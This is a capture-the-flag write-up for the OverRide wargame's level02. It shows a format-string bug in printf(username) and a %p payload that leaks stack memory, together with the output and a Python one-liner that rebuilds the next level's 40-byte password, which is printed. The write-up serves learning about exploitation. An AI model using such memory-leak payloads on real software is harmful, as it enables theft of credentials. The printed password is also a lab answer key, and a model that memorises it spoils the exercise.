level02
=======

```console
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```

*	We spawn with a *level02* executable and here is the [code](src/level02.c)
* Looking at the code, we notice:
  - The program reads the `40-byte` password from `/home/users/level03/.pass` and stores it on the stack.
  - Both username and password are read using `fgets()`.
  - The username is later passed directly to `printf(username)`, creating a **format string vulnerability**.
*	Let's use `%p` to leak values from the stack:
	```console
	level02@OverRide:~$ ./level02 
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
	--[ Password: *****************************************
	aaaa 0x7fffffffe4f0 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x2070252070252070 0x7025207025207025 0x20702520 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 -->0x2070252061616161<-- 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
	```
* We find our input `aaaa` at the **28th position**, represented by `0x2070252061616161`.
* Looking at the preceding values, we notice five consecutive 8-byte values at positions **22 to 26**:
  ```console
  22: 0x756e505234376848
  23: 0x45414a3561733951
  24: 0x377a7143574e6758
  25: 0x354a35686e475873
  26: 0x48336750664b394d
  ```
* Since the binary is **64-bit**, each value represents 8 bytes. These five values contain our `40-byte` password (5 × 8 = 40).
*	Last thing to do would be to convert it:
	```console
	level02@OverRide:~$ python -c 'print("\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] + "\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] + "\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] + "\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] + "\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1])'
	Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
	```